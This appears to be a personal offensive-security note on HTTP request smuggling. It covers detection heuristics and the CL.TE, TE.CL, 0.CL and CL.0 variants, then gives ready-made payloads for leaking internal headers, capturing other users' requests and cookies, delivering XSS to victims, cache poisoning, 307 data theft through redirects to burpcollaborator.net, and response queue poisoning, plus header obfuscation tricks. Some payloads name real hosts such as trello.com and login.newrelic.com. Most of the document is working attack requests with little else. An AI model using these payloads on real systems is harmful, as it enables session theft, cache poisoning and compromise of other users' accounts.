

### Detection Technique

#### Heuristic 1

1. CL.TE (Back end will timeout, waiting for the next chunk size)
2. TE.TE / TE.CL (invalid chunk size so frontend will reject it)
3. CL.CL (process normally)
```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4
	
1\r\n
Z\r\n
X
```


#### Heuristic 2

- TE.CL (back end will timeout, waiting for the last byte X)
- TE.TE / CL.CL (process normally)
- CL.TE (socket poisoning will happen)
```http
POST /about HTTP/1.1  
Host: example.com  
Transfer-Encoding: chunked  
Content-Length: 6  
  
0\r\n
\r\n
X
```


For TE.CL payloads special care needs to taken for setting the chunked size and \r\n. burp helps with it by hovering over the chunk size.

![[Pasted image 20250815232212.png]]

### 0.CL

- Send a first request with obfuscated CL that frontend server misses it and backend server parses it.
- Follow up it with a request prefix which will be eaten by the first request content length, the second request will be from GET /admin.
this second request contains the head request and the poison for the victim 3rd request


##### requests from front end server perspective

```
POST /anything HTTP/1.1
Host: <redacted>
Content-length:
 44
 ------- 2nd request -----
GET /doesnot-matter HTTP/1.1
Content-Length: 150
Foo: GET /admin HTTP/1.1
Host: <redacted>

HEAD /index.html HTTP/1.1
Host: <redacted>

GET /assets?<script>alert(1)</script> HTTP/1.1
X: Y

----- 3rd request victims ----
GET /cacheme.html HTTP/1.1
Host: <redacted>
```

##### responses from backend server perspective

```
POST /anything HTTP/1.1
Host: <redacted>
Content-length:
 44
 
GET /doesnot-matter HTTP/1.1
Content-Length: 150
Foo:

------- 2nd request -----
GET /admin HTTP/1.1
Host: <redacted>

----- 3rd request -------

HEAD /index.html HTTP/1.1
Host: <redacted>

----- 4th request ------
GET /assets?<script>alert(1)</script> HTTP/1.1
X: YGET /cachme.html HTTP/1.1
Host: <redacted>
```

##### responses parsed by the frontend server

```
HTTP/1.1 200 OK
----- 2nd response ----
HTTP/1.1 200 OK
Location: /admin

----- 3rd response ---
HTTP/1.1 200 OK
Content-Length: 56670
Content-Type: text/html

HTTP/1.1 302 Found
Location: /Logon?returnUrl=/<script>…
```

----

#### CL.0 via expect header

- expect header makes the server to response maturely, stating its good to send the request body.
  
Akamai --> 2025 August

## Methods


##### Two Variations

1. Both attacking and victim requests are from us, so we can smuggle a particular data from front end. --> Type 1
2. Only attacking request is from us and the victim(real user) eats the smuggled request and get poisoned. --> Type 2



#### Leaking internal headers (Type 1)

- finding a page that reflects a parameter in the input value like login forms, if the request attributes contains invalid params. 
*CL.TE*
```http
POST / HTTP/1.1  
Host: login.newrelic.com  
Content-Length: 142  
Transfer-Encoding: chunked  
Transfer-Encoding: x  
  
0  
  
POST /login HTTP/1.1  
Host: login.newrelic.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 100  

login[email]=EOLPOST /login HTTP/1.1  
Host: login.newrelic.com
```


#### Storing other users data into our account (Type 2)

- if we find a request that stores data into our account, we can smuggle the request and make the other user request get appends with it and see the cookies of other users

TE.CL

```http
POST /1/cards HTTP/1.1  
Host: trello.com  
Transfer-Encoding:[tab]chunked  
Content-Length: 4  
  
9f  
PUT /1/members/1234 HTTP/1.1  
Host: trello.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 400  
  
x=x&csrf=1234&username=testzzz&bio=cake
0  
  
GET / HTTP/1.1  
Host: trello.com
```


#### Upgrading XSS (Type 2)

if we found a reflective XSS in a site we can leverage that to poison any user, who's request got appended with our smuggled request

TE.CL
```http
POST / HTTP/1.1  
Host: saas-app.com  
Content-Length: 4  
Transfer-Encoding : chunked  
  
10  
=x&cr={creative}&x=  
66  
POST /index.php HTTP/1.1  
Host: saas-app.com  
Content-Length: 200  
  
SAML=a"><script>alert(1)</script>
0
POST / HTTP/1.1  
Host: saas-app.com  
Cookie: …
```


#### Open Redirect (Type 2)

Similar to xss, but redirecting user to a malicious site


### Web cache poisoning (Type 1)

- Certain web servers like IIS and apache will return redirect request if a folder is requested without a slash at the end. if we able to smuggle a request with a malicious host header and the next request requested contains xyz.js the cdn will try to cache the 301 redirect to malicious user site. Leads to the poisoning of the entire cache. (Type 1)

CL.TE

```http
POST /assets/libs/random.js HTTP/1.1  
Host: redacted  
Content-Length: 57  
Transfer-Encoding: chunked  
  
0  
  
POST /assets HTTP/1.1  
Host: burpcollaborator.net  
X: XGET /assets/libs/xyz.js HTTP/1.1
```

```
HTTP/1.1 301 Moved Permanently  
Location: https://burpcollaborator.net/assets/
```

(Avoid accidental cache poisoning with cache-busting headers in the followup request)
#### Stealing user data with 307 redirect (Type 2)

 if there is an endpoint where the backend server responds with 307 and the user request contains any post data, the browser will try to send the data to the malicious site.

```http
POST /home HTTP/1.1  
Host: redacted  
Content-Length: 57  
Transfer-Encoding: chunked  
  
0  
  
POST /assets HTTP/1.1  
Host: burpcollaborator.net  
X: XPOST /login HTTP/1.1
```


### Web cache deception (Type 2)

- Caching the victim response page and then accessing it. (no-cache directive is not explicitly set in  /account/settings endpoint)

```http
POST / HTTP/1.1  
Content-Length: 57  
Transfer-Encoding: chunked  
  
0  
  
GET /account/settings HTTP/1.1  
X: XGET /static/site.js HTTP/1.1  
Cookie: sessionid=victim
```


#### Response Queue Poisoning

if Possible smuggle an entire http request so according to backend there are two requests leading to complete disruptions for all other user requests which uses the pipeline.

```http
POST / HTTP/1.1  
Content-Length: 57  
Transfer-Encoding: chunked  
  
0  
  
GET /account/settings HTTP/1.1  
Host: example.com

```

### Header Mutations

```http
Transfer-Encoding: xchunked

Transfer-Encoding[space]: chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```